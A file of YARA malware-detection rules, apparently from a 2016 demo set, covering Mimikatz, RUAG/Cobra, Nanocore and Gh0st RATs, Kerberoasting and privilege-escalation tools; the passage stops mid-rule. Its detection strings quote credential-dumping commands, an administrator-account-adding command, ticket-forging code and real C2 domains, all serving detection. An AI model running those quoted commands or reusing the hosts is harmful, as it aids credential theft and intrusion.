rule Mimikatz_Strings_RID2DA0 : DEMO EXE FILE MAL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects Mimikatz strings"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-06-08 10:39:51"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, S0002, T1003, T1075, T1097, T1136, T1178"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "sekurlsa::logonpasswords" fullword wide ascii
      $x2 = "List tickets in MIT/Heimdall ccache" fullword ascii wide
      $x3 = "kuhl_m_kerberos_ptt_file ; LsaCallKerberosPackage %08x" fullword ascii wide
      $x4 = "* Injecting ticket :" fullword wide ascii
      $x5 = "mimidrv.sys" fullword wide ascii
      $x6 = "Lists LM & NTLM credentials" fullword wide ascii
      $x7 = "\\_ kerberos -" fullword wide ascii
      $x8 = "* unknow   :" fullword wide ascii
      $x9 = "\\_ *Password replace ->" fullword wide ascii
      $x10 = "KIWI_MSV1_0_PRIMARY_CREDENTIALS KO" ascii wide
      $x11 = "\\\\.\\mimidrv" wide ascii
      $x12 = "Switch to MINIDUMP :" fullword wide ascii
      $x13 = "[masterkey] with password: %s (%s user)" fullword wide
      $x14 = "Clear screen (doesn't work with redirections, like PsExec)" fullword wide
      $x15 = "** Session key is NULL! It means allowtgtsessionkey is not set to 1 **" fullword wide
      $x16 = "[masterkey] with DPAPI_SYSTEM (machine, then user): " fullword wide
   condition: 
      ( ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( 3 of them ) ) and not pe.imphash ( ) == "77eaeca738dd89410a432c6bd6459907"
} 

rule IronGate_APT_Step7ProSim_Gen_RID3173 : APT DEMO EXE FILE GEN T1136 {
   meta:
      description = "Detects IronGate APT Malware - Step7ProSim DLL"
      author = "Florian Roth"
      reference = "https://goo.gl/Mr6M2J"
      date = "2016-06-04 13:23:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\obj\\Release\\Step7ProSim.pdb" ascii
      $s1 = "Step7ProSim.Interfaces" fullword ascii
      $s2 = "payloadExecutionTimeInMilliSeconds" fullword ascii
      $s3 = "PackagingModule.Step7ProSim.dll" fullword wide
      $s4 = "<KillProcess>b__0" fullword ascii
      $s5 = "newDllFilename" fullword ascii
      $s6 = "PackagingModule.exe" fullword wide
      $s7 = "$863d8af0-cee6-4676-96ad-13e8540f4d47" fullword ascii
      $s8 = "RunPlcSim" fullword ascii
      $s9 = "$ccc64bc5-ef95-4217-adc4-5bf0d448c272" fullword ascii
      $s10 = "InstallProxy" fullword ascii
      $s11 = "DllProxyInstaller" fullword ascii
      $s12 = "FindFileInDrive" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( $x1 or 3 of ( $s* ) ) ) or ( 6 of them )
} 

rule IronGate_PyInstaller_update_EXE_RID3323 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects a PyInstaller file named update.exe as mentioned in the IronGate APT"
      author = "Florian Roth"
      reference = "https://goo.gl/Mr6M2J"
      date = "2016-06-04 14:35:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bpython27.dll" fullword ascii
      $s5 = "%s%s.exe" fullword ascii
      $s6 = "bupdate.exe.manifest" fullword ascii
      $s9 = "bunicodedata.pyd" fullword ascii
      $s11 = "distutils.sysconfig(" fullword ascii
      $s16 = "distutils.debug(" fullword ascii
      $s18 = "supdate" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
} 

rule Nirsoft_NetResView_RID2E41 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects NirSoft NetResView - utility that displays the list of all network resources"
      author = "Florian Roth"
      reference = "https://goo.gl/Mr6M2J"
      date = "2016-06-04 11:06:41"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NetResView.exe" fullword wide
      $s2 = "2005 - 2013 Nir Sofer" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
} 

rule LM_hash_empty_String_RID2F11 : DEMO HKTL T1136 {
   meta:
      description = "Detects the empty LM hash on disk/in memory/as output from hacking tools"
      author = "Florian Roth"
      reference = "-"
      date = "2016-06-03 11:41:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "500:AAD3B435B51404EEAAD3B435B51404EE:" ascii
      $s1 = "500:aad3b435b51404eeaad3b435b51404ee:" ascii
   condition: 
      1 of them
} 

rule Win_PrivEsc_gp3finder_v4_0_RID30D3 : DEMO EXE FILE HKTL T1068 T1136 {
   meta:
      description = "Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe"
      author = "Florian Roth"
      reference = "http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/"
      date = "2016-06-02 12:56:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Check for and attempt to decrypt passwords on share" ascii
      $x2 = "Failed to auto get and decrypt passwords. {0}s/" fullword ascii
      $x3 = "GPPPFinder - Group Policy Preference Password Finder" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( all of them )
} 

rule Win_PrivEsc_folderperm_RID2FE9 : DEMO HKTL T1068 T1086 T1136 {
   meta:
      description = "Detects a tool that can be used for privilege escalation - file folderperm.ps1"
      author = "Florian Roth"
      reference = "http://www.greyhathacker.net/?p=738"
      date = "2016-06-02 12:17:21"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1068, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "# powershell.exe -executionpolicy bypass -file folderperm.ps1" fullword ascii
      $x2 = "Write-Host \"[i] Dummy test file used to test access was not outputted:\" $filetocopy" fullword ascii
      $x3 = "Write-Host -foregroundColor Red \"      Access denied :\" $myarray[$i] " fullword ascii
   condition: 
      1 of them
} 

rule Win_PrivEsc_ADACLScan4_3_RID2F59 : DEMO HKTL T1068 T1086 T1136 {
   meta:
      description = "Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1"
      author = "Florian Roth"
      reference = "https://adaclscan.codeplex.com/"
      date = "2016-06-02 11:53:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1068, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<Label x:Name=\"lblPort\" Content=\"Port:\"  HorizontalAlignment=\"Left\" Height=\"28\" Margin=\"10,0,0,0\" Width=\"35\"/>" fullword ascii
      $s2 = "(([System.IconExtractor]::Extract(\"mmcndmgr.dll\", 126, $true)).ToBitMap()).Save($env:temp + \"\\Other.png\")    " fullword ascii
      $s3 = "$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)" fullword ascii
   condition: 
      all of them
} 

rule TidePool_Malware_RID2D59 : DEMO EXE FILE MAL T1085 T1136 {
   meta:
      description = "Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks"
      author = "Florian Roth"
      reference = "http://goo.gl/m2CXWR"
      date = "2016-05-24 10:28:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Content-Disposition: form-data; name=\"m1.jpg\"" fullword ascii
      $x2 = "C:\\PROGRA~2\\IEHelper\\mshtml.dll" fullword wide
      $x3 = "C:\\DOCUME~1\\ALLUSE~1\\IEHelper\\mshtml.dll" fullword wide
      $x4 = "IEComDll.dat" fullword ascii
      $s1 = "Content-Type: multipart/form-data; boundary=----=_Part_%x" fullword wide
      $s2 = "C:\\Windows\\System32\\rundll32.exe" fullword wide
      $s3 = "network.proxy.socks_port\", " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) ) ) or ( 4 of them )
} 

rule RUAG_Tavdig_Malformed_Executable_RID3355 : APT DEMO EXE FILE {
   meta:
      description = "Detects an embedded executable with a malformed header - known from Tavdig malware"
      author = "Florian Roth"
      reference = "https://goo.gl/N5MEj0"
      date = "2016-05-23 14:43:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3C ) ) == 0x0000AD0B
} 

rule RUAG_Cobra_Malware_RID2DAE : APT DEMO EXE FILE MAL NK T1136 {
   meta:
      description = "Detects a malware mentioned in the RUAG Case called Carbon/Cobra"
      author = "Florian Roth"
      reference = "https://goo.gl/N5MEj0"
      date = "2016-05-23 10:42:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Cobra\\Release\\Cobra.pdb" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1
} 

rule RUAG_Bot_Config_File_RID2E58 : APT DEMO FILE T1136 {
   meta:
      description = "Detects a specific config file used by malware in RUAG APT case"
      author = "Florian Roth"
      reference = "https://goo.gl/N5MEj0"
      date = "2016-05-23 11:10:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[CONFIG]" ascii
      $s2 = "name = " ascii
      $s3 = "exe = cmd.exe" ascii
   condition: 
      uint32 ( 0 ) == 0x4e4f435b and $s1 at 0 and $s2 and $s3 and filesize < 160
} 

rule RUAG_Cobra_Config_File_RID2F1A : APT DEMO FILE NK T1136 {
   meta:
      description = "Detects a config text file used by malware Cobra in RUAG case"
      author = "Florian Roth"
      reference = "https://goo.gl/N5MEj0"
      date = "2016-05-23 11:42:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "[NAME]" ascii
      $s1 = "object_id=" ascii
      $s2 = "[TIME]" ascii fullword
      $s3 = "lastconnect" ascii
      $s4 = "[CW_LOCAL]" ascii fullword
      $s5 = "system_pipe" ascii
      $s6 = "user_pipe" ascii
      $s7 = "[TRANSPORT]" ascii
      $s8 = "run_task_system" ascii
      $s9 = "[WORKDATA]" ascii
      $s10 = "address1" ascii
   condition: 
      uint32 ( 0 ) == 0x4d414e5b and $h1 at 0 and 8 of ( $s* ) and filesize < 5KB
} 

rule RUAG_Exfil_Config_File_RID2F2B : APT DEMO FILE T1020 T1136 {
   meta:
      description = "Detects a config text file used in data exfiltration in RUAG case"
      author = "Florian Roth"
      reference = "https://goo.gl/N5MEj0"
      date = "2016-05-23 11:45:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1020, T1136"
      minimum_yara = "1.7"
      
   strings:
      $h1 = "[TRANSPORT]" ascii
      $s1 = "system_pipe" ascii
      $s2 = "spstatus" ascii
      $s3 = "adaptable" ascii
      $s4 = "post_frag" ascii
      $s5 = "pfsgrowperiod" ascii
   condition: 
      uint32 ( 0 ) == 0x4152545b and $h1 at 0 and all of ( $s* ) and filesize < 1KB
} 

rule No_PowerShell_RID2C32 : DEMO EXE FILE HKTL SCRIPT T1086 T1136 {
   meta:
      description = "Detects an C# executable used to circumvent PowerShell detection - file nps.exe"
      author = "Florian Roth"
      reference = "https://github.com/Ben0xA/nps"
      date = "2016-05-21 09:38:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "nps.exe -encodedcommand {base64_encoded_command}" fullword wide
      $s2 = "c:\\Development\\ghps\\nps\\nps\\obj\\x86\\Release\\nps.pdb" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $s* ) ) ) or ( all of them )
} 

rule GetUserSPNs_VBS_RID2C7E : DEMO HKTL SCRIPT T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file GetUserSPNs.vbs"
      author = "Florian Roth"
      reference = "https://github.com/skelsec/PyKerberoast"
      date = "2016-05-21 09:51:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SCRIPT, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Wscript.Echo \"User Logon: \" & oRecordset.Fields(\"samAccountName\")" fullword ascii
      $s2 = "Wscript.Echo \" USAGE:        \" & WScript.ScriptName & \" SpnToFind [GC Servername or Forestname]\"" fullword ascii
      $s3 = "strADOQuery = \"<\" + strGCPath + \">;(&(!objectClass=computer)(servicePrincipalName=*));\" & _" fullword ascii
   condition: 
      2 of them
} 

rule GetUserSPNs_PS1_RID2C67 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file GetUserSPNs.ps1"
      author = "Florian Roth"
      reference = "https://github.com/skelsec/PyKerberoast"
      date = "2016-05-21 09:47:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()" fullword ascii
      $s2 = "@{Name=\"PasswordLastSet\";      Expression={[datetime]::fromFileTime($result.Properties[\"pwdlastset\"][0])} } #, `" fullword ascii
      $s3 = "Write-Host \"No Global Catalogs Found!\"" fullword ascii
      $s4 = "$searcher.PropertiesToLoad.Add(\"pwdlastset\") | Out-Null" fullword ascii
   condition: 
      2 of them
} 

rule kerberoast_PY_RID2C4B : DEMO HKTL T1136 T1208 {
   meta:
      description = "Semiautomatically generated YARA rule - file kerberoast.py"
      author = "Florian Roth"
      reference = "https://github.com/skelsec/PyKerberoast"
      date = "2016-05-21 09:43:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136, T1208"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)" fullword ascii
      $s2 = "key = kerberos.ntlmhash(args.password)" fullword ascii
      $s3 = "help='the password used to decrypt/encrypt the ticket')" fullword ascii
      $s4 = "newencserverticket = kerberos.encrypt(key, 2, e, nonce)" fullword ascii
   condition: 
      2 of them
} 

rule ONHAT_Proxy_Hacktool_RID2EA0 : DEMO EXE FILE HKTL T1020 T1086 T1090 T1136 {
   meta:
      description = "Detects ONHAT Proxy - Htran like SOCKS hack tool used by Chinese APT groups"
      author = "Florian Roth"
      reference = "https://goo.gl/p32Ozf"
      date = "2016-05-12 11:22:31"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1020, T1086, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "INVALID PARAMETERS. TYPE ONHAT.EXE -h FOR HELP INFORMATION." fullword ascii
      $s2 = "[ONHAT] LISTENS (S, %d.%d.%d.%d, %d) ERROR." fullword ascii
      $s3 = "[ONHAT] CONNECTS (T, %d.%d.%d.%d, %d.%d.%d.%d, %d) ERROR." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 1 of ( $s* ) ) ) or ( 2 of them )
} 

rule BeepService_Hacktool_RID2EF2 : DEMO EXE FILE HKTL T1035 T1077 T1086 T1136 {
   meta:
      description = "Detects BeepService Hacktool used by Chinese APT groups"
      author = "Florian Roth"
      reference = "https://goo.gl/p32Ozf"
      date = "2016-05-12 11:36:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, HKTL, T1035, T1077, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\\\%s\\admin$\\system32\\%s" fullword ascii
      $s1 = "123.exe" fullword ascii
      $s2 = "regclean.exe" fullword ascii
      $s3 = "192.168.88.69" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $x1 and 1 of ( $s* )
} 

rule GhostDragon_Gh0stRAT_Sample2_RID3170 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/the-ghost-dragon"
      date = "2016-04-23 13:22:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "AdobeWpk" fullword ascii
      $x2 = "seekin.dll" fullword ascii
      $c1 = "Windows NT 6.1; Trident/6.0)" fullword ascii
      $c2 = "Mozilla/5.0 (compatible; MSIE 10.0; " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( all of ( $x* ) or all of ( $c* ) ) ) or ( all of them )
} 

rule GhostDragon_Gh0stRAT_Sample3_RID3171 : DEMO MAL {
   meta:
      description = "Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report"
      author = "Florian Roth"
      reference = "https://blog.cylance.com/the-ghost-dragon"
      date = "2016-04-23 13:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL"
      minimum_yara = "1.7"
      
   strings:
      $op1 = { 44 24 15 65 88 54 24 16 c6 44 24 } 
      $op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e } 
      $op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 } 
   condition: 
      all of them
} 

rule PoisonIvy_RAT_ssMUIDLL_RID2F13 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects PoisonIvy RAT DLL mentioned in Palo Alto Blog in April 2016"
      author = "Florian Roth"
      reference = "http://goo.gl/WiwtYT"
      date = "2016-04-22 11:41:41"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ssMUIDLL.dll" fullword ascii
      $op1 = { 6a 00 c6 07 e9 ff d6 } 
      $op2 = { 02 cb 6a 00 88 0f ff d6 47 ff 4d fc 75 } 
      $op3 = { 6a 00 88 7f 02 ff d6 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( all of ( $op* ) ) ) or ( all of them )
} 

rule Nanocore_RAT_Gen_1_RID2D95 : APT DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Detetcs the Nanocore RAT and similar malware"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 10:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\Logintech\\Dropbox\\Projects\\New folder\\Latest\\Benchmark\\Benchmark\\obj\\Release\\Benchmark.pdb" fullword ascii
      $x2 = "RunPE1" fullword ascii
      $x3 = "082B8C7D3F9105DC66A7E3267C9750CF43E9D325" fullword ascii
      $x4 = "$374e0775-e893-4e72-806c-a8d880a49ae7" fullword ascii
      $x5 = "Monitorinjection" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )
} 

rule Nanocore_RAT_Gen_2_RID2D96 : APT DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Detetcs the Nanocore RAT"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 10:38:11"
      score = 100
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "NanoCore.ClientPluginHost" fullword ascii
      $x2 = "IClientNetworkHost" fullword ascii
      $x3 = "#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them ) or ( all of them )
} 

rule Nanocore_RAT_Sample_1_RID2EDD : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detetcs a certain Nanocore RAT sample"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 11:32:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK" fullword wide
      $x2 = "1EF0D55861681D4D208EC3070B720C21D885CB35" fullword ascii
      $x3 = "popthatkitty.Resources.resources" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) ) ) or ( all of them )
} 

rule Nanocore_RAT_Sample_2_RID2EDE : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detetcs a certain Nanocore RAT sample"
      author = "Florian Roth"
      reference = "https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/"
      date = "2016-04-22 11:32:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "U4tSOtmpM" fullword ascii
      $s2 = ")U71UDAU_QU_YU_aU_iU_qU_yU_" fullword wide
      $s3 = "Cy4tOtTmpMtTHVFOrR" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of ( $s* )
} 

rule Metasploit_Loader_RSMudge_RID30DF : DEMO EXE FILE METASPLOIT SUSP T1136 {
   meta:
      description = "Detects a Metasploit Loader by RSMudge - file loader.exe"
      author = "Florian Roth"
      reference = "https://github.com/rsmudge/metasploit-loader"
      date = "2016-04-20 12:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, METASPLOIT, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Could not resolve target" fullword ascii
      $s2 = "Could not connect to target" fullword ascii
      $s3 = "%s [host] [port]" fullword ascii
      $s4 = "ws2_32.dll is out of date." fullword ascii
      $s5 = "read a strange or incomplete length value" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 3 of ( $s* ) ) ) or ( all of them )
} 

rule APT6_Malware_Sample_Gen_RID2F8E : DEMO EXE FILE GEN MAL T1136 {
   meta:
      description = "Rule written for 2 malware samples that communicated to APT6 C2 servers"
      author = "Florian Roth"
      reference = "https://otx.alienvault.com/pulse/56c4d1664637f26ad04e5b73/"
      date = "2016-04-09 12:02:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, EXE, FILE, GEN, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "SPCK!it is a [(?riddle?) wrapped in a {mystery}] inside an <enigma>!" fullword ascii
      $x3 = "636C7369643A46334430443336462D323346382D343638322D413139352D373443393242303344344146" fullword ascii
      $s1 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" fullword ascii
      $s2 = "DUMPTHIN" fullword ascii
      $s3 = "\"C:\\WINDOWS\\system32\\" fullword ascii
      $s4 = "window.eval(f.decodeURIComponent(a));" fullword ascii
      $s5 = "/tbedrs.dll" fullword ascii
      $s6 = "NSISDL/1.2 (Mozilla)" fullword ascii
      $s7 = "NSIS_Inetc (Mozilla)" fullword ascii
      $s8 = "/logos.gif" fullword ascii
      $s9 = "synflood" fullword ascii
      $s10 = "IconFile=C:\\WINDOWS\\system32\\SHELL32.dll" fullword ascii
      $s11 = "udpflood" fullword ascii
      $s12 = "shellcode" fullword ascii
      $s13 = "&PassWord=" fullword ascii
      $s14 = "SystemPropertiesProtection.exe" fullword ascii
      $s15 = "SystemPropertiesRemote.exe" fullword ascii
      $c1 = "jobcall.org" ascii
      $c2 = "sportsinfinite.com" ascii
      $c3 = "milsatcom.us" ascii
      $c4 = "geographicphotographer.com" ascii
      $c5 = "snowsmooth.com" ascii
      $c6 = "goodre.net" ascii
      $c7 = "gloflabs.com" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $x* ) and 3 of ( $s* ) ) or 1 of ( $c* ) ) ) or ( 6 of them )
} 

rule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 T1136 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, LINUX, T1046, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "rm -rf scan.log session.txt" fullword ascii
      $s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
      $s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7362 and all of them )
} 

rule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 T1136 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, LINUX, T1046, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
      $s3 = "rm -rf scan.log" fullword ascii
   condition: 
      all of them
} 

rule TempRacer_RID2A94 : DEMO EXE FILE HKTL T1068 T1087 T1136 {
   meta:
      description = "Detects privilege escalation tool - file TempRacer_RID2A94.exe"
      author = "Florian Roth"
      reference = "http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/"
      date = "2016-03-30 06:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1068, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\obj\\Release\\TempRacer_RID2A94.pdb" ascii
      $s2 = "[+] Injecting into " fullword wide
      $s3 = "net localgroup administrators alex /add" fullword wide
      $s4 = "[+] File: {0} renamed to {1}" fullword wide
      $s5 = "[+] Blocking " fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and 1 of them ) or ( 4 of them )
} 

rule FourElementSword_Config_File_RID321A : DEMO MAL T1136 {
   meta:
      description = "Detects FourElementSword Malware"
      author = "Florian Roth"
      reference = "not set"
      date = "2016-03-26 13:50:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "01,,hccutils.dll,2" fullword ascii
      $s1 = "RegisterDlls=OurDll" fullword ascii
      $s2 = "[OurDll]" fullword ascii
      $s3 = "[DefaultInstall]" fullword ascii
      $s4 = "Signature=\"$Windows NT$\"" fullword ascii
   condition: 
      4 of them
} 

rule FourElementSword_ElevateDLL_2_RID3218 : DEMO EXE FILE MAL T1082 T1136 {
   meta:
      description = "Detects FourElementSword Malware"
